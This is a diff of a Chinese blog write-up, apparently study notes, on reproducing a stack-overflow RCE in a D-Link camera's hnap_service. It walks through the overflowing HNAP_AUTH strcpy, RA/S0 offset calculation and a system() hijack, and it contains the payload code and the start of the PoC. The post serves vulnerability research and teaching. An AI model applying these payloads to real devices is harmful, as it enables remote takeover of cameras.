@@ -288,16 +288,17 @@ unicode: "f6d2"
     <li><a href="#验证">验证</a>
       <ol>
         <li><a href="#成功溢出">成功溢出</a></li>
-        <li><a href="#错误修正">错误修正</a></li>
+        <li><a href="#分割错误修正">分割错误修正</a></li>
       </ol>
     </li>
     <li><a href="#漏洞利用">漏洞利用</a>
       <ol>
         <li><a href="#原理">原理</a></li>
-        <li><a href="#控制ra寄存器">控制RA寄存器</a></li>
-        <li><a href="#ra劫持目标">ra劫持目标</a></li>
+        <li><a href="#计算ra寄存器偏移">计算RA寄存器偏移</a></li>
+        <li><a href="#ra劫持目标">RA劫持目标</a></li>
         <li><a href="#控制并劫持s0寄存器">控制并劫持S0寄存器</a></li>
-        <li><a href="#验证-1">验证</a></li>
+        <li><a href="#异常覆盖问题排查">异常覆盖问题排查</a></li>
+        <li><a href="#实现栈溢出rce">实现栈溢出RCE</a></li>
       </ol>
     </li>
   </ol>
@@ -340,6 +341,10 @@ unicode: "f6d2"
         
             <a href="/categories/%E6%A0%88%E6%BA%A2%E5%87%BA/" >
                 栈溢出
+            </a>
+        
+            <a href="/categories/rce/" >
+                RCE
             </a>
         
     </header>
@@ -388,7 +393,7 @@ unicode: "f6d2"
 
 
                 <time class="article-time--reading">
-                    阅读时长: 13 分钟
+                    阅读时长: 15 分钟
                 </time>
             </div>
         
@@ -404,7 +409,8 @@ unicode: "f6d2"
     
     
     <p>这篇文章主要是参考<a class="link" href="https://www.bilibili.com/video/BV19VAUzUEL6/?spm_id_from=333.337.search-card.all.click&amp;vd_source=38b3680952ba912cbee44397df0b531e"  target="_blank" rel="noopener"
-    >二进制安全 摄像头0day漏洞挖掘入门第一课_哔哩哔哩_bilibili</a>进行学习，在这个过程中纪录的学习笔记</p>
+    >二进制安全 摄像头0day漏洞挖掘入门第一课_哔哩哔哩_bilibili</a>进行学习时记录的笔记，同时参考<a class="link" href="https://bbs.kanxue.com/thread-290519.htm"  target="_blank" rel="noopener"
+    >D-Link 摄像头栈溢出漏洞复现-IoT安全-看雪安全社区</a></p>
 <h2 id="初步分析">初步分析
 </h2><blockquote>
 <p>找漏洞之前首先要通过<a class="link" href="https://fofa.so/?locale=zh-CN"  target="_blank" rel="noopener"
@@ -422,9 +428,9 @@ unicode: "f6d2"
 </div>
 </div><p>得到一个文件夹，其中包含如下文件，固件分析一般在<code>squashfs-root</code>下进行</p>
 <img src="1.png" style="width: 70%;" />
-<p>下一步需要查找web服务相关的程序，关键词如<code>html</code>、<code>.php</code>、<code>.aspx</code>、<code>favicon.icon</code>、<code>web</code>、<code>http</code>等和web相关的关键词。这里查到有一个名称是<code>web</code>的文件夹，里面有<code>favicon.ico</code>和一些<code>.asp</code>文件，推测这就是目标文件夹</p>
+<p>下一步需要查找web服务相关的程序，关键词如<code>html</code>、<code>.php</code>、<code>.aspx</code>、<code>favicon.ico</code>、<code>web</code>、<code>http</code>等和<code>web</code>相关的关键词。这里查到有一个名称是<code>web</code>的文件夹，里面有<code>favicon.ico</code>和一些<code>.asp</code>文件，推测这就是目标文件夹</p>
 <img src="2.png" style="width: 70%;" />
-<p><code>web</code>目录下有一个<code>httpd</code>文件，以<code>d</code>为后缀说明这是<code>http</code>服务的服务端。还有一个文件夹名称是<code>cgi_bin</code>，推测设备采用的是<code>cgi</code>协议。<code>cgi</code>的特点就是将用户传入的参数设置为环境变量，然后用<code>getenv()</code>来获取环境变量</p>
+<p><code>web</code>目录下有一个<code>httpd</code>文件，以<code>d</code>为后缀说明这是<code>http</code>服务的服务端。还有一个文件夹名称是<code>cgi-bin</code>，推测设备采用的是<code>cgi</code>协议。<code>cgi</code>的特点就是将用户传入的参数设置为环境变量，然后用<code>getenv()</code>来获取环境变量</p>
 <p><code>cgi-bin</code>中可以看到<code>hnap</code>文件夹，<code>hnap</code>是一个D-Link、TP-Link等厂商设备中常见的Web协议。文件夹中包含<code>hnap_service</code>，这就是这次的分析目标</p>
 <blockquote>
 <p>一般情况在分析这类小型固件时，由于文件数量较少且逆向方便，可以逐个程序进行分析</p>
@@ -439,7 +445,7 @@ unicode: "f6d2"
 <blockquote>
 <p><code>strcpy(a,b)</code>意思就是用<code>strcpy</code>函数将<code>b</code>的内容复制到<code>a</code>中。因此在<code>strcpy(栈上有限字符串,用户输入)</code>中，如果用户输入字符串的长度超过栈可容纳上限，超出部分也一同被复制，这就导致了溢出</p>
 </blockquote>
-<p>挨个查看调用，通过伪代码寻找有可能出现栈溢出的位置。注意到<code>sub_402280</code>函数中有这样的一句<code>strcpy(v28, v12);</code>，查看定义<code>char v28[256]; // [sp+64h] [-40Ch] BYREF</code>，<code>v12 = getenv(&quot;HNAP_AUTH&quot;);</code>，分别是256字节大小的字符串和用户输入，刚好符合栈溢出可能产生的条件。这时如果<code>HNAP_AUTH</code>大于了<code>256</code>字节，就会产生溢出</p>
+<p>挨个查看调用，通过伪代码寻找有可能出现栈溢出的位置。注意到<code>sub_402280</code>函数中有这样的一句<code>strcpy(v28, v12);</code>，查看定义<code>char v28[256]; // [sp+64h] [-40Ch] BYREF</code>，<code>v12 = getenv(&quot;HNAP_AUTH&quot;);</code>，分别是256字节大小的字符串和用户输入，刚好符合栈溢出可能产生的条件。这时如果<code>HNAP_AUTH</code>大等于<code>256</code>字节，就会产生溢出</p>
 <img src="6.png" style="width: 70%;" />
 <p>发现溢出点后，可以对其进行标记，也就是将本地变量名改成便于识别的形式，右键重命名。我这里分别改了函数名和记录用户输入的变量名</p>
 <img src="7.png" style="width: 60%;" />
@@ -486,7 +492,7 @@ unicode: "f6d2"
 <li><code>SOAP_ACTION=&quot;1&quot;</code></li>
 <li><code>atoi(CONTENT_LENGTH)&lt;0x20000</code></li>
 <li><code>COOKIE=&quot;uid=&quot;</code></li>
-<li><code>HNAP_AUTH=&quot;超出256字节的字符串&quot;</code></li>
+<li><code>HNAP_AUTH=&quot;大等于256字节的字符串&quot;</code></li>
 </ul>
 <h2 id="动态调试">动态调试
 </h2><h3 id="初步调试">初步调试
@@ -552,7 +558,7 @@ unicode: "f6d2"
 <img src="13.png" style="width: 90%;" />
 <p>打开<code>ida</code>，选择<code>debugger</code>开启<code>gdb</code>调试，然后选择<code>process options</code>，填入刚刚的<code>ip</code>和端口</p>
 <img src="14.png" style="width: 50%;" />
-<img src="24.png" style="width: 50%;" />
+<img src="24.png" style="width: 80%;" />
 <p>按<code>f9</code>运行，确认弹窗后来到这个界面说明成功接入调试器</p>
 <img src="15.png" style="width: 100%;" />
 <p>我先前在程序中打过断点，进入后按一次<code>f9</code>，程序执行后停在第一个断点处，然后按<code>f5</code>就可以查看伪代码，暗紫色就是程序停住的地方，分析完一句便按<code>f9</code>继续</p>
@@ -630,17 +636,17 @@ unicode: "f6d2"
 <img src="19.png" style="width: 100%;" />
 <p>最终来到<code>strcpy(v28, DANGER_IVAR);</code>，成功产生了栈溢出</p>
 <img src="21.png" style="width: 80%;" />
-<h3 id="错误修正">错误修正
+<h3 id="分割错误修正">分割错误修正
 </h3><p>这里注意到产生溢出后继续执行，会产生报错，指向<code>2B43D76C</code></p>
 <img src="23.png" style="width: 80%;" />
-<p>在溢出这一句之后有<code>v19 = strtok(v28, &quot; &quot;);</code>，也就是将字符串以空格分割，字符串中原本是空格的第一个位置会被替换成<code>/x00</code>，然后将前半部分的内容赋值给<code>v19</code>。后面还有<code>v20 = strtok(0, &quot; &quot;);</code>，也就是接着上一句的位置再分割一次，将后半部分的内容赋值给<code>v20</code>。为了防止报错，实现时应该在<code>HNAP_AUTH</code>的值中加上一个空格</p>
+<p>在溢出这一句之后有<code>v19 = strtok(v28, &quot; &quot;);</code>，也就是将字符串以空格分割，字符串中原本是空格的第一个位置会被替换成<code>\x00</code>，然后将前半部分的内容赋值给<code>v19</code>。后面还有<code>v20 = strtok(0, &quot; &quot;);</code>，也就是接着上一句的位置再分割一次，将后半部分的内容赋值给<code>v20</code>。为了防止报错，实现时应该在<code>HNAP_AUTH</code>的值中加上一个空格</p>
 <p><strong>因此最终确认产生溢出，并保证程序正常执行需要如下条件成立</strong>：</p>
 <ul>
 <li><code>REQUEST_METHOD=&quot;POST&quot;</code></li>
 <li><code>SOAP_ACTION=&quot;1&quot;</code></li>
 <li><code>CONTENT_LENGTH=&quot;$(wc -c &lt; /stdin.txt)&quot;</code></li>
 <li><code>COOKIE=&quot;uid=&quot;</code></li>
-<li><code>HNAP_AUTH=超过256字节大小的字符串，其中包含一个空格</code></li>
+<li><code>HNAP_AUTH=大等于256字节大小的字符串，其中包含一个空格</code></li>
 <li>固件根目录下存在<code>/tmp</code>目录</li>
 <li>固件根目录下有<code>stdin.txt</code>，里面写入构造的xml</li>
 </ul>
@@ -660,8 +666,8 @@ unicode: "f6d2"
 <p>假如向原本预留了<code>40</code>字节的变量中存入<code>100</code>字节的值，那么在预留内存满后，多出来的部分会继续向高地址存储，最终覆盖最初存储的返回地址。继续往下执行到<code>return</code>后，它会取到错误的地址并赋值给<code>ip</code>寄存器，这个地址可能指向错误的位置，更可能在内存中不存在，程序就会直接崩溃</p>
 <p><strong>栈溢出的利用</strong>：</p>
 <p>如果在溢出的输入中夹杂一个地址，让这个地址正好覆盖在返回地址的位置，而地址指向的是某个后门函数，那么函数返回后，程序执行流被劫持到后门函数，就会导致非法执行</p>
-<h3 id="控制ra寄存器">控制RA寄存器
-</h3><p>之前将<code>HNAP_AUTH</code>的值设定为多个<code>a</code>，那么溢出后的返回地址也会变成4个a的十六进制，这样便无法找到<code>HNAP_AUTH</code>中具体第几个字符覆盖了返回地址。因此这里需要采用<code>cyclic</code>字符串，也就是一种每四个字节都独一无二的字符串。然后通过获取返回地址的十六进制，在<code>cyclic</code>字符串中找到对应的四个字符，从而获取所需位置</p>
+<h3 id="计算ra寄存器偏移">计算RA寄存器偏移
+</h3><p>之前将<code>HNAP_AUTH</code>的值设定为多个<code>a</code>，那么溢出后的返回地址也会变成4个<code>a</code>的十六进制，这样便无法找到<code>HNAP_AUTH</code>中具体第几个字符覆盖了返回地址。因此这里需要采用<code>cyclic</code>字符串，也就是一种每四个字节都独一无二的字符串。然后通过获取返回地址的十六进制，在<code>cyclic</code>字符串中找到对应的四个字符，从而获取所需位置</p>
 <p>由于命令行无法处理部分特殊字符，这一步采用<code>python</code>来实现</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -727,24 +733,24 @@ unicode: "f6d2"
 </span></span><span class="line"><span class="cl"><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>进入<code>main</code>函数，关联伪代码与汇编，首先打开汇编<code>IDA View-A</code>与伪代码<code>Pseudocode-A</code>，拖动成主界面的两栏，在<code>Pseudocode-A</code>中左键并如图选择关联，就会发现伪代码成功与汇编对应</p>
-<img src="27.png" style="width: 80%;" />
-<p>既然控制的是返回值，<code>return</code>的时候<code>ra</code>与<code>pc</code>寄存器会产生变化，这里便重点分析<code>return</code>语句，在<code>ra</code>寄存器的汇编处打几个断点</p>
-<img src="28.png" style="width: 80%;" />
-<p>运行程序后进行调试，可以程序由于<code>6A61616C</code>地址非法而报错，</p>
-<img src="25.png" style="width: 80%;" />
+</div><p>进入<code>main</code>函数，关联伪代码与汇编，首先打开汇编<code>IDA View-A</code>与伪代码<code>Pseudocode-A</code>，拖动成主界面的两栏，在<code>Pseudocode-A</code>中左键并如图选择关联，就能将伪代码与汇编对应</p>
+<img src="27.png" style="width: 90%;" />
+<p><code>return</code>的时候<code>ra</code>与<code>pc</code>寄存器会产生变化，这里便重点分析<code>return</code>语句，在<code>ra</code>寄存器的汇编处打几个断点</p>
+<img src="28.png" style="width: 100%;" />
+<p>运行程序后进行调试，可以看到程序由于<code>6A61616C</code>地址非法而报错，</p>
+<img src="25.png" style="width: 100%;" />
 <p>右上角<code>general registers</code>中也能看到<code>ra</code>和<code>pc</code>寄存器都变成了<code>6A61616C</code></p>
-<img src="29.png" style="width: 80%;" />
-<p>这个十六进制转成字符串也就是<code>jaal</code>，在<code>HNAP_AUTH</code>中定位，得知是在第<code>1137</code>字节，</p>
-<img src="26.png" style="width: 80%;" />
-<p>为了进行验证，我这里将<code>jaal</code>的部分替换成了<code>t4t4</code>并修改程序，重新进行调试后，发现寄存器的值果然变成了<code>0x74347434</code>，也就是说这时我们已经可以控制返回地址，将目标地址放在第<code>1137</code>到<code>1140</code>字节就可以劫持程序执行流</p>
-<img src="30.png" style="width: 80%;" />
-<h3 id="ra劫持目标">ra劫持目标
+<img src="29.png" style="width: 40%;" />
+<p>这个十六进制转成字符串也就是<code>jaal</code>，在<code>HNAP_AUTH</code>中定位，得知是在第<code>1137</code>字节</p>
+<img src="26.png" style="width: 100%;" />
+<p>为了进行验证，我将<code>jaal</code>的部分替换成了<code>t4t4</code>并重新进行调试，发现寄存器的值果然变成了<code>0x74347434</code>，也就是说这时已经可以控制返回地址，将目标地址放在第<code>1137</code>到<code>1140</code>字节就可以劫持程序执行流</p>
+<img src="30.png" style="width: 40%;" />
+<h3 id="ra劫持目标">RA劫持目标
 </h3><blockquote>
-<p>成功控制<code>ra</code>寄存器后，如果我们能将程序执行流劫持到<code>system()</code>函数，然后修改<code>a0</code>寄存器的值，便可以执行任意指令</p>
+<p>成功控制<code>ra</code>寄存器后，如果能将程序执行流劫持到<code>system()</code>函数，然后修改<code>a0</code>寄存器的值，便可以执行任意指令</p>
 </blockquote>
 <p>为了不打乱程序的执行流，首先尝试在<code>main</code>函数中寻找<code>system()</code>，可以看到<code>system(&amp;v32);</code>这一句可以进行控制，记录它对应汇编开头的地址<code>0x004033E8</code></p>
-<img src="31.png" style="width: 80%;" />
+<img src="31.png" style="width: 100%;" />
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -756,25 +762,122 @@ unicode: "f6d2"
 <pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">lw</span>      <span class="o">$</span><span class="n">gp</span><span class="p">,</span> <span class="mh">0x202F8</span><span class="o">+</span><span class="n">var_202D8</span><span class="p">(</span><span class="o">$</span><span class="n">sp</span><span class="p">)</span> <span class="o">//</span><span class="err">恢复</span><span class="n">gp寄存器</span><span class="err">，类似于初始化</span>
 </span></span><span class="line"><span class="cl"><span class="n">la</span>      <span class="o">$</span><span class="n">t9</span><span class="p">,</span> <span class="n">system</span>  <span class="o">//</span><span class="err">把</span><span class="n">system的函数地址加载到t9寄存器</span>
 </span></span><span class="line"><span class="cl"><span class="n">jalr</span>    <span class="o">$</span><span class="n">t9</span> <span class="p">;</span> <span class="n">system</span>  <span class="o">//</span><span class="err">跳转到</span><span class="n">t9寄存器保存的地址</span><span class="err">，也就是间接调用</span><span class="n">system</span>
-</span></span><span class="line"><span class="cl"><span class="n">move</span>    <span class="o">$</span><span class="n">a0</span><span class="p">,</span> <span class="o">$</span><span class="n">s0</span>         <span class="c1"># command //把s0寄存器的值复制到a0寄存器，也就是system的command参数</span>
+</span></span><span class="line"><span class="cl"><span class="n">move</span>    <span class="o">$</span><span class="n">a0</span><span class="p">,</span> <span class="o">$</span><span class="n">s0</span>  <span class="o">//</span><span class="err">把</span><span class="n">s0寄存器的值复制到a0寄存器</span><span class="err">，也就是</span><span class="n">system的command参数</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><code>mips</code>中有延迟槽机制，也就是在分支或跳转，如<code>jalr</code>与<code>jr</code>指令后一句的指令，无论分支是否发生，这条指令都必然执行，也就是<code>move    $a0, $s0</code>的执行顺序在<code>jalr    $t9 ; system</code>之前。也就是说，目标变成了控制<code>s0</code>寄存器，并让<code>s0</code>寄存器指向我们想作为命令执行的字符串</p>
+</div><p><code>mips</code>中有延迟槽机制，也就是位于分支或跳转指令，如<code>jalr</code>与<code>jr</code>指令后一句的指令，无论分支是否发生，这条指令都必然执行，也就是<code>move    $a0, $s0</code>的执行顺序在<code>jalr    $t9 ; system</code>之前。这时目标就变成了控制<code>s0</code>寄存器，并让<code>s0</code>寄存器指向想作为命令执行的字符串</p>
 <h3 id="控制并劫持s0寄存器">控制并劫持S0寄存器
-</h3><p><code>s0</code>寄存器也可以通过溢出来控制。重新进行调试，发现<code>s0</code>寄存器对应<code>0x7A61616C</code>，也就是<code>zaal</code>，位于第1101到第1102字节处</p>
-<img src="32.png" style="width: 80%;" />
-<p>关于需要指向的命令字符串，可以通过环境变量与用户输入来传入。它必须保存在不会改变的内存地址中，才能被我们直接命中，但这个程序为了安全性采用了栈随机，每次程序运行时栈的起始地址都不同，这就导致环境变量的地址会无法命中</p>
-<p>为了验证用户输入是不是保存在固定的内存空间，这里将<code>soap_body</code>的子节点与文本改成特殊标记值<code>&lt;soap:Body&gt;&lt;MARKTAG&gt;MARKTEXT&lt;/MARKTAG&gt;&lt;/soap:Body&gt;</code></p>
-<p>启动调试后让程序运行到返回处并停在这里，然后选择<code>search&gt;sequence of bytes</code>，填入字符串的<code>hex</code>值，也就是<code>ascll</code>码的十六进制进行搜索</p>
-<img src="33.png" style="width: 80%;" />
-<p>成功搜索到<code>MARKTEXT</code>，地址0x00431240</p>
-<img src="34.png" style="width: 80%;" />
+</h3><p><code>s0</code>寄存器也可以通过溢出来控制。重新进行调试，发现它对应<code>0x7A61616C</code>，也就是<code>zaal</code>，位于第<code>1101</code>到第<code>1104</code>字节处</p>
+<img src="32.png" style="width: 60%;" />
+<p>关于目标的命令字符串，可以通过环境变量与标准输入来传入。它必须保存在不会改变的内存地址中，才能被直接命中，但当前环境采用了栈随机，每次程序运行时栈的起始地址都不同，这就导致通过环境变量传入的地址会无法命中</p>
+<p>为了验证标准输入是不是保存在固定的内存空间，这里将<code>soap_body</code>的子节点与文本改成特殊标记值<code>&lt;soap:Body&gt;&lt;MARKTAG&gt;MARKTEXT&lt;/MARKTAG&gt;&lt;/soap:Body&gt;</code></p>
+<p>启动调试后让程序运行到返回处并停在这里，然后选择<code>search&gt;sequence of bytes</code>，填入字符串的<code>hex</code>值，也就是<code>ascii</code>码的十六进制进行搜索</p>
+<img src="33.png" style="width: 50%;" />
+<p>成功搜索到<code>MARKTEXT</code>，地址<code>0x00431240</code></p>
+<img src="34.png" style="width: 40%;" />
 <p>为了确认这个地址的类型，这里打开程序段界面</p>
-<img src="35.png" style="width: 80%;" />
-<p>可以看到内存起始地址是0x00430EAC，也就是说目标地址在内存的开头部分，这便确认了这个地址大概率不会发生变动。同一设备无论请求多少次，<code>stdin</code> 都固定在请求地址附近，栈地址则不稳定，不同设备甚至不同进程都可能不同</p>
-<img src="36.png" style="width: 80%;" />
-<h3 id="验证-1">验证
-</h3><p>至此流程便明了了，首先根据上面找到的偏移位置，将pc部分填入0x004033E8，将s0部分填入0x00431240，将<code>MARKTEXT</code>部分改成ls。程序执行后来到system()，再由s0将ls参数传给函数，最终实现system(ls)</p>
+<img src="35.png" style="width: 90%;" />
+<p>可以看到内存起始地址是<code>0x00430EAC</code>，也就是说目标地址在内存的开头部分，这便确认了这个地址大概率不会发生变动</p>
+<img src="36.png" style="width: 100%;" />
+<h3 id="异常覆盖问题排查">异常覆盖问题排查
+</h3><blockquote>
+<p>至此流程便明了了，首先根据上面找到的偏移位置，将ra部分填入<code>0x004033E8</code>，将<code>s0</code>部分填入<code>0x00431240</code>，将<code>MARKTEXT</code>部分改成<code>ls</code>。程序执行后来到<code>system()</code>，再由<code>s0</code>将<code>ls</code>参数传给函数，最终实现<code>system(ls)</code></p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">soap_body</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&lt;soap:Body&gt;&lt;MARKTAG&gt;ls&lt;/MARKTAG&gt;&lt;/soap:Body&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HNAP_AUTH</span> <span class="o">=</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;a&#34;</span> <span class="o">*</span> <span class="mi">1100</span>
+</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34; </span><span class="se">\x43\x12\x40</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;b&#34;</span> <span class="o">*</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34; </span><span class="se">\x40\x33\xe8</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>调试后没有按照预期成功溢出，而是出现了一个奇怪的现象，<code>HNAP_AUTH</code>中的普通字符串能直接覆盖寄存器，改成了类似<code>  \x43\x12\x40</code>的地址却不行，后来发现是空格的问题，第一个字节是空格时，后续字节便无法正确覆盖</p>
+<ul>
+<li><code>$s0 = 0x00616161</code></li>
+<li><code>$ra = 0x61616161</code></li>
+<li><code>$pc = 0x61616160</code></li>
+</ul>
+<img src="37.png" style="width: 100%;" />
+<blockquote>
+<p>分析代码后得出结论：<code>HNAP_AUTH</code> 被复制了两次</p>
+</blockquote>
+<p>对汇编进行分析：</p>
+<ul>
+<li><code>strcpy(&amp;v28, DANGER_IVAR);</code>：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">004028</span><span class="n">F0</span>                 <span class="n">addiu</span>   <span class="o">$</span><span class="n">s2</span><span class="p">,</span> <span class="o">$</span><span class="n">sp</span><span class="p">,</span> <span class="mh">0x470</span><span class="o">+</span><span class="n">var_40C</span>
+</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00402928</span>                 <span class="n">move</span>    <span class="o">$</span><span class="n">a0</span><span class="p">,</span> <span class="o">$</span><span class="n">s2</span>  
+</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">0040292</span><span class="n">C</span>                 <span class="n">la</span>      <span class="o">$</span><span class="n">t9</span><span class="p">,</span> <span class="n">strcpy</span>
+</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00402934</span>                 <span class="n">move</span>    <span class="o">$</span><span class="n">a1</span><span class="p">,</span> <span class="o">$</span><span class="n">s4</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>strcpy</code>的<code>$a0</code>是目标地址，所以<code>$s2</code>就是<code>v28</code>。IDA栈帧中<code>var_40C = -0x40C</code></p>
+<p><strong>v28 = sp + 0x470 - 0x40C = sp + 0x64</strong></p>
+<ul>
+<li><code>strcpy((char *)v26, v19);</code>：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00402958</span>                 <span class="n">addiu</span>   <span class="o">$</span><span class="n">s7</span><span class="p">,</span> <span class="o">$</span><span class="n">sp</span><span class="p">,</span> <span class="mh">0x470</span><span class="o">+</span><span class="n">var_44C</span>
+</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">0040295</span><span class="n">C</span>                 <span class="n">move</span>    <span class="o">$</span><span class="n">a0</span><span class="p">,</span> <span class="o">$</span><span class="n">s7</span> 
+</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00402960</span>                 <span class="n">la</span>      <span class="o">$</span><span class="n">t9</span><span class="p">,</span> <span class="n">strcpy</span>
+</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00402964</span>                 <span class="n">jalr</span>    <span class="o">$</span><span class="n">t9</span> <span class="p">;</span> <span class="n">strcpy</span>
+</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00402968</span>                 <span class="n">move</span>    <span class="o">$</span><span class="n">a1</span><span class="p">,</span> <span class="o">$</span><span class="n">v0</span>       
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>$s7</code>就是<code>v26</code>。IDA栈帧中<code>var_44C = -0x44C</code></p>
+<p><strong>v26 = sp + 0x470 - 0x44C = sp + 0x24</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">strcpy(v28, HNAP_AUTH);     // 完整输入，起点v28 = sp+0x64
+</span></span><span class="line"><span class="cl">v19 = strtok(v28, &#34; &#34;);     // 遇到空格，把空格改成\x00
+</span></span><span class="line"><span class="cl">strcpy(v26, v19);           // 只复制第一个空格前的部分，起点 v26 = sp+0x24
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>v26</code> 比 <code>v28</code> 低 <code>0x40</code>也就是<code>64</code>字节，因此同一段数据走两条路径时，到达保存寄存器的偏移不同</p>
+<ul>
+<li>保存的<code>s0 = v28 + 1036 = v26 + 1100</code></li>
+<li>保存的<code>ra = v28 + 1072 = v26 + 1136</code></li>
+</ul>
+<p>计算偏移时，<code>HNAP_AUTH = cyclic(2000) + b&quot;  aaa&quot;</code>，空格位于<code>2000</code>字节后，<code>2000</code>个字节远大于<code>1136</code>，因此<code>strtok</code>得到的字符串仍然是完整的 <code>cyclic(2000)</code>，两次会依次写入同一片寄存器区域。第一次<code>v28</code>写入的会被第二次<code>v26</code>写入的覆盖，得到的自然是<code>v26</code>计算出来的偏移</p>
+<p>后续改成了<code>b&quot;a&quot; * 1100 + b&quot; \x43\x12\x40&quot; + b&quot;b&quot; * 32 + b&quot; \x40\x33\xe8&quot;</code> ，这里的空格在第<code>1100</code>字节，第一次<code>v28</code>写入时两个地址分别在<code>v28 + 1100</code>和<code>v28+1136</code>，原本的目标位置则是<code>aaaa</code>。<code>strcpy(v26, v19)</code> 后，<code>v26</code>只剩下<code>1100</code>个<code>a</code>，写入后会在结尾再写一个 <code>\x00</code>，而结尾第<code>1101</code>字节正是<code>s0</code>的开头，因此<code>s0</code>变成了<code>0x00616161</code></p>
+<p>正确思路是让初始的 <code>strcpy(v28, HNAP_AUTH)</code>负责写<code>$s0</code>和<code>$ra</code>，并让后续 <code>strcpy(v26, v19)</code> 在到达保存寄存器前停止，也就是将偏移改成<code>v28</code>对应的偏移</p>
+<h3 id="实现栈溢出rce">实现栈溢出RCE
+</h3><p>poc如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -813,43 +916,43 @@ unicode: "f6d2"
 </span><span class="lnt">34
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import os
-</span></span><span class="line"><span class="cl">import subprocess
-</span></span><span class="line"><span class="cl">from pwn import *
-</span></span><span class="line"><span class="cl">import os
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">os.chroot(&#34;.&#34;)
-</span></span><span class="line"><span class="cl">os.chdir(&#34;/&#34;)
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">chroot</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">soap_body = b&#39;&lt;soap:Body&gt;&lt;MARKTAG&gt;ls&lt;/MARKTAG&gt;&lt;/soap:Body&gt;&#39;
+</span></span><span class="line"><span class="cl"><span class="n">soap_body</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&lt;soap:Body&gt;&lt;MARKTAG&gt;ls&lt;/MARKTAG&gt;&lt;/soap:Body&gt;&#39;</span>
 </span></span><span class="line"><span class="cl">
